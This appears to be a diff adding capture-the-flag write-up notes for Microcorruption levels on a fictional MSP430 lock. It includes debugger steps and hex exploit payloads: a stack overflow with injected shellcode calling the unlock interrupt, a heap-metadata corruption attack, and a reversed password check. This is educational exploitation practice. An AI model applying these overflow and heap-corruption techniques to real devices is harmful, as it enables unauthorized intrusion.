+    The LockIT Pro c.04  is the first of a new series  of locks. It is
+    controlled by a  MSP430 microcontroller, and is  the most advanced
+    MCU-controlled lock available on the  market. The MSP430 is a very
+    low-power device which allows the LockIT  Pro to run in almost any
+    environment.
+
+    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
+    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
+    be inaccessable from the exterior of the building.
+
+    There  is no  default  password  on the  LockIT  Pro HSM-2.   Upon
+    receiving the  LockIT Pro,  a new  password must  be set  by first
+    connecting the LockitPRO HSM to  output port two, connecting it to
+    the LockIT Pro App, and entering a new password when prompted, and
+    then restarting the LockIT Pro using the red button on the back.
+    
+    LockIT Pro Hardware  Security Module 2 stores  the login password,
+    ensuring users  can not access  the password through  other means.
+    The LockIT Pro  can send the LockIT Pro HSM-2  a password, and the
+    HSM will  directly send the  correct unlock message to  the LockIT
+    Pro Deadbolt  if the password  is correct, otherwise no  action is
+    taken.
+    
+    This is Hardware  Version C.  It contains  the Bluetooth connector
+    built in, and two available  ports: the LockIT Pro Deadbolt should
+    be  connected to  port  1,  and the  LockIT  Pro  HSM-2 should  be
+    connected to port 2.
+
+    This is  Software Revision  04. Due to  user confusion  over which
+    characters passwords may contain,  only alphanumeric passwords are
+    accepted.
+
+Solution:
+# Note this level only accepts alphanumeric characters,
+# so we can only use 0x30-0x39, 0x41-0x5a and 0x61-0x7a
+break main
+c
+Input: 111122223333
+# Note we have a 200-byte space to play with, starting from 0x2400
+c
+'''
+Note our input starts at 0x43ed, and the return address is at 0x43fe
+43fe - 43ed = 17
+We want to call INT 0x7f
+Note that 0x4654 in getsn is within our limited range and allows us to enter more input that is unconstrained
+We ret to 0x4654, specify the address to write to, the input size and the ret addr
+'''
+python -c "print '41' * 17 + '5446' + '3044' * 3"
+reset
+c
+c
+Input: 41414141414141414141414141414141415446304430443044
+c
+'''
+Assemble:
+push #0x7f
+call  #0x45fc
+= 30127f00b012fc45
+'''
+Input: 30127f00b012fc45
+c
+# We got our solution
+solve
+Input: 41414141414141414141414141414141415446304430443044
+Input: 30127f00b012fc45
+
+
+Level 17: Chernobyl
+
+OVERVIEW
+
+    - This lock contains the all-new LockIT Pro Account Manager.
+
+
+DETAILS
+
+    The LockIT Pro d.02  is the first of a new series  of locks. It is
+    controlled by a  MSP430 microcontroller, and is  the most advanced
+    MCU-controlled lock available on the  market. The MSP430 is a very
+    low-power device which allows the LockIT  Pro to run in almost any
+    environment.
+
+    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
+    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
+    be inaccessable from the exterior of the building.
+
+    LockIT Pro Account Manager solves the problem of sharing passwords
+    when  multiple users  must  have  access to  a  lock. The  Account
+    Manager contains  a mapping of users  to PINs, each of  which is 4
+    digits.  The  system supports  hundreds of users,  each configured
+    with his or her own PIN,  without degrading the performance of the
+    manager.
+
+    There are no accounts set up  on the LockIT Pro Account Manager by
+    default. An administrator must first initialize the lock with user
+    accounts  and  their  PINs.  User  accounts  are  by  default  not
+    authorized  for access,  but can  be authorized  by attaching  the
+    Account  Manager  Authorizer.  This  prevents  users  from  adding
+    themselves to the lock during its use.
+    
+    This is Hardware  Version D.  It contains  the Bluetooth connector
+    built in, and one available port, to which the LockIT Pro Deadbolt
+    should be connected. When authorizing PINs, the Deadbolt should be
+    disconnected and the Authorizer should be attached in its place.
+
+    This   is  Software   Revision   02.  It   contains  the   all-new
+    vault-manager software.
+
+
+Solution:
+break main
+c
+c
+Input: aaaa bbbb
+c
+Input: aaaa bbb
+s ...
+# Note the stack pointer is just at the start of our name
+s ...
+# Note the 0x4ce6:  jnz	#0x4bbe <run+0x58>
+# 0x4bbe is cmp.b	#0x61, r15
+# 0x61 = a
+s ...
+#0x4bc2:  jne	#0x4c38 <run+0xd2>
+# 0x4c38 is    cmp.b	#0x6e, r15
+# 0x6e = n
+s ...
+# 4bdc:    mov.b	@r11, r15
+# r15 now holds our first b
+s
+# The process repeats itself, this time with our pin
+# Note 49cc <get_from_table>, we will be stepping through and examining it
+# The hash function gets called 
+s ...
+'''
+Note that rehash calls both malloc and free
+As in the Algiers level, the key is to manipulate header metadata
+For a refresher, read: 
+http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html
+We need to set the backwards pointer (bk) as the destination address, and forward pointer (fd) as the return address
+'''
+# After going through the challenge again, I noticed we can use ; to chain entries
+# Rehash gets called after our twelfth entry in the chain
+# There is space for five entries per chain; the sixth will overwrite
+# Note that new memory chunks are stored right after the last allocated chunk
+# See chernobyl.py for a working solution
+solve
+Input: 6e6577203020313b6e6577203820313b6e6577204820313b6e6577205020313b6e657720ca3d0101feff3420313b6e657720ca3da250b9f48a505c51feff3020313b6e6577205820313b6e6577206820313b6e6577207020313b6e6577207820313b6e657720303020313b6e657720303820313b324000ff30401000
+
+
+Level 18: Hollywood
+
+OVERVIEW
+
+    - New randomization improves code security.
+    - This lock is not attached to any hardware security module.
+
+
+DETAILS
+
+    The LockIT Pro a.04  is the first of a new series  of locks. It is
+    controlled by a  MSP430 microcontroller, and is  the most advanced
+    MCU-controlled lock available on the  market. The MSP430 is a very
+    low-power device which allows the LockIT  Pro to run in almost any
+    environment.
+
+    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
+    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
+    be inaccessable from the exterior of the building.
+
+    There is  no default password  on the LockIT  Pro---upon receiving
+    the LockIT Pro, a new password must be set by connecting it to the
+    LockIT Pro  App and  entering a password  when prompted,  and then
+    restarting the LockIT Pro using the red button on the back.
+    
+    This is Hardware  Version A.  It contains  the Bluetooth connector
+    built in, and one available port  to which the LockIT Pro Deadbolt
+    should be connected.
+
+    This is Software  Revision 04. Our developers have  included a new
+    hardware  random number  generator, making  it impossible  to know
+    where the password  will be. We apologize again for  making it too
+    easy  for the  password to  be recovered.   Those responsible  for
+    sacking the engineers who were previously sacked have been sacked.
+
+
+Solution:
+'''
+Everything is randomized, so we have to step through all of the program
+We get the following algorithm that deals with user input:
+
+mov #2600 r5
+clr r6
+add @r5, r4
+swpb r4
+xor @r5+, r6
+xor r4, r6
+xor r6, r4
+tst 0x0(r5)
+mov sr, r7
+and #0x2, r7
+rra r7
+xor #0x1, r7
+swpb    r7
+rra r7
+sxt r7
+swpb    r7
+sxt r7
+mov #0x4b18, r8
+and r7 r8
+and #0x47aa, r7
+add r7, r8
+clr r7
+mov r8, r12
+cmp #0xfeb1, r4
+mov sr, r7
+clr r4
+cmp #0x9298, r6
+and sr, r7
+clr r6
+rra r7
+xor #0x1, r7
+swpb r7
+rra r7
+rra r7
+rra r7
+rra r7
+bis r7, sr
+mov #0xff00, sr
+call #0x10
+
+'''
+# See hollywood.py for our key generator
+solve
+Input: 1220833eef6b
+
